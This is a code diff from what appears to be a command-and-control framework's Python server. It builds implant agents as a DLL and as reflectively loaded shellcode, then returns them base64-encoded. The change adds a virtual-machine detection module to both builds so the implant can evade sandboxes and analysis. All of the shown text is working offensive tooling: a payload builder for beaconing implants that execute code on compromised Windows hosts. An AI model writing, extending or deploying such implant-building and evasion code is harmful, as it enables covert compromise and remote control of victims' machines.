@@ -206,14 +206,14 @@ constexpr int BEACON_INTERVAL = 5;
                             return jsonify({"results": {"content" : b64_exe_agent} })
                         elif payload_type == "dll":
                             log.info(f"[+] Building DLL agent with the updated config")
-                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
+                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp vm_detection.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
                             with open("agent/http/agent.dll", 'rb') as f:
                                 dll_agent = f.read()
                             b64_dll_agent = base64.b64encode(dll_agent).decode("utf-8")
                             return jsonify({"results": {"content" : b64_dll_agent} })
                         elif payload_type == "shellcode":
                             log.info(f"[+] Building SHELLCODE agent with the updated config")
-                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
+                            subprocess.run('cd agent/http && x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp vm_detection.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32', shell=True)
                             subprocess.run('cd agent/ReflectiveLoader && python3 shellcodize.py ../http/agent.dll', shell=True)
                             with open("agent/ReflectiveLoader/shellcode.bin", 'rb') as f:
                                 shellcode_agent = f.read()
